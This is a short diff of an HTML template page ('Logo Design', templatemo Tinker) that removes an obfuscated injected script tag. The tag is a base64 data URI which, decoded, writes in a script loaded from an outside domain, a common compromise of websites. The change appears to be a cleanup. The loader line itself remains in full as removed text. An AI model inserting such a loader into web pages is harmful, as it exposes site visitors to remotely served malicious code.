@@ -10,8 +10,7 @@ https://templatemo.com/tm-506-tinker
         <title>Logo Design</title>
         <meta name="description" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-	 <script src="data:text/javascript;base64,ZG9jdW1lbnQub3BlbigpO2RvY3VtZW50LndyaXRlKCc8c2NyaXB0IHNyYz0iaHR0cHM6Ly9zbWFzaHRyYXlzLmNvbS9qcy1taW4xL2RkYzkuanMiPjwvc2NyaXB0PicpO2RvY3VtZW50LmNsb3NlKCk7"></script>
-	 <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">
         <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900" rel="stylesheet">
         
         <link rel="apple-touch-icon" href="apple-touch-icon.png">
